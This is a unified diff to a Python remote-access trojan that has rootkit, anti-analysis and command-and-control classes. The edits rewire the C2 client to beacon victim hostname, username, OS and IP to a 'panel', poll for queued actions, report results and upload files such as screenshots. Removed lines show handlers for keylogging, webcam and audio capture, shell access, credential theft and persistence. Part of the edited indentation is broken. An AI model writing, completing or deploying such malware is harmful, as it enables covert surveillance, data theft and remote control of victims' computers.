@@ -4218,9 +4218,14 @@ class Rootkit:
             pass
         except:
             pass
-
-class C2Communication:
+class C2Communication:  
     def __init__(self):
+        # ========== PANEL CONFIGURATION – CHANGE THESE ==========
+        self.panel_url = "http://localhost:5000"   # Your panel's URL
+        self.token = "tg_..."                      # Generated token from panel
+        self.chat_id = "-100..."                   # Generated chat_id from panel
+        # ========================================================
+        
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -4244,76 +4249,91 @@ class C2Communication:
             pass
             
     def send_beacon(self):
+        """Send heartbeat and system info to panel's /api/log endpoint."""
         try:
-            data = {
-                'victim_id': victim_id,
+            info = {
                 'hostname': socket.gethostname(),
-                'platform': platform.platform(),
                 'username': getpass.getuser(),
-                'timestamp': datetime.now().isoformat(),
-                'ip_address': requests.get('https://api.ipify.org').text
+                'os': platform.platform(),
+                'ip_address': requests.get('https://api.ipify.org', timeout=10).text,
+                'country': 'Unknown',
+                'country_code': 'XX'
             }
-            
-            response = self.session.post(
-                f"{C2_SERVER}/beacon",
-                json=data,
-                timeout=30
-            )
-            
-            if response.status_code == 200:
-                commands = response.json().get('commands', [])
-                for cmd in commands:
-                    self.command_queue.put(cmd)
-                    
-            self.last_beacon = time.time()
-            return True
-        except:
-            try:
-                response = self.session.post(
-                    f"{BACKUP_C2}/beacon",
-                    json=data,
-                    timeout=30
-                )
-                return True
-            except:
-                return False
-                
-    def send_result(self, command_id, result):
-        try:
             data = {
-                'victim_id': victim_id,
-                'command_id': command_id,
-                'result': result,
-                'timestamp': datetime.now().isoformat()
+                'token': self.token,
+                'chat_id': self.chat_id,
+                'level': 'INFO',
+                'message': json.dumps(info)
             }
-            
             response = self.session.post(
-                f"{C2_SERVER}/result",
+                f"{self.panel_url}/api/log",
                 json=data,
                 timeout=30
             )
-            return True
+            self.last_beacon = time.time()
+            return response.status_code == 201
         except:
             return False
-            
+
+    def fetch_commands(self):
+        """Poll panel for pending actions and add them to command_queue."""
+        try:
+            response = self.session.get(
+                f"{self.panel_url}/api/actions/pending",
+                params={'token': self.token, 'chat_id': self.chat_id},
+                timeout=30
+            )
+            if response.status_code == 200:
+                actions = response.json().get('actions', [])
+                for act in actions:
+                    self.command_queue.put({
+                        'id': act['action_id'],
+                        'type': act['type'],
+                        'params': act.get('params', {})
+                    })
+                return True
+        except:
+            pass
+        return False
+
+    def send_result(self, action_id, result):
+        """Report command execution result back to panel."""
+        try:
+            data = {
+                'token': self.token,
+                'chat_id': self.chat_id,
+                'action_id': action_id,
+                'status': 'completed' if result.get('success', False) else 'failed',
+                'result': json.dumps(result)
+            }
+            response = self.session.post(
+                f"{self.panel_url}/api/actions/result",
+                json=data,
+                timeout=30
+            )
+            return response.status_code == 200
+        except:
+            return False
+
     def upload_file(self, file_path, command_id=None):
+        """Upload a file (e.g., screenshot) to panel's /api/upload."""
         try:
             with open(file_path, 'rb') as f:
-                files = {'file': f}
+                files = {'file': (os.path.basename(file_path), f)}
                 data = {
-                    'victim_id': victim_id,
-                    'command_id': command_id
+                    'token': self.token,
+                    'chat_id': self.chat_id
                 }
                 response = self.session.post(
-                    f"{C2_SERVER}/upload",
+                    f"{self.panel_url}/api/upload",
                     files=files,
                     data=data,
                     timeout=300
                 )
-                return True
+                return response.status_code == 201
         except:
             return False
-            
+
     def download_file(self, url, save_path):
         try:
             response = self.session.get(url, stream=True, timeout=300)
@@ -4323,7 +4343,7 @@ class C2Communication:
             return True
         except:
             return False
-            
+
     def process_commands(self):
         while not self.command_queue.empty():
             cmd = self.command_queue.get()
@@ -4334,36 +4354,6 @@ class C2Communication:
             result = self.execute_command(cmd_type, cmd_params)
             self.send_result(cmd_id, result)
             
-    def execute_command(self, cmd_type, params):
-        handlers = {
-            'screenshot': self.cmd_screenshot,
-            'keylog': self.cmd_keylog,
-            'webcam': self.cmd_webcam,
-            'audio': self.cmd_audio,
-            'shell': self.cmd_shell,
-            'download': self.cmd_download,
-            'upload': self.cmd_upload,
-            'ls': self.cmd_ls,
-            'rm': self.cmd_rm,
-            'cp': self.cmd_cp,
-            'mv': self.cmd_mv,
-            'ps': self.cmd_ps,
-            'kill': self.cmd_kill,
-            'sysinfo': self.cmd_sysinfo,
-            'clipboard': self.cmd_clipboard,
-            'credentials': self.cmd_credentials,
-            'persist': self.cmd_persist,
-            'cleanup': self.cmd_cleanup,
-            'update': self.cmd_update,
-            'sleep': self.cmd_sleep,
-            'exit': self.cmd_exit
-        }
-        
-        handler = handlers.get(cmd_type)
-        if handler:
-            return handler(params)
-        return {'error': 'Unknown command'}
-        
     def cmd_screenshot(self, params):
         try:
             screenshot = ImageGrab.grab()
@@ -4647,16 +4637,17 @@ def main():
         AntiAnalysis.evade_analysis()
         
         c2 = C2Communication()
-        
-        def beacon_loop():
-            while True:
-                try:
-                    c2.send_beacon()
-                    c2.process_commands()
-                    time.sleep(c2.beacon_interval)
-                except:
-                    time.sleep(60)
-        
+             
+ def beacon_loop():
+     while True:
+         try:
+            c2.send_beacon()          # Send heartbeat/system info to panel
+            c2.fetch_commands()       # Poll panel for pending actions
+            c2.process_commands()     # Execute and report results
+            time.sleep(c2.beacon_interval)
+         except:
+            time.sleep(60)
+
         threading.Thread(target=beacon_loop, daemon=True).start()
         
         try:
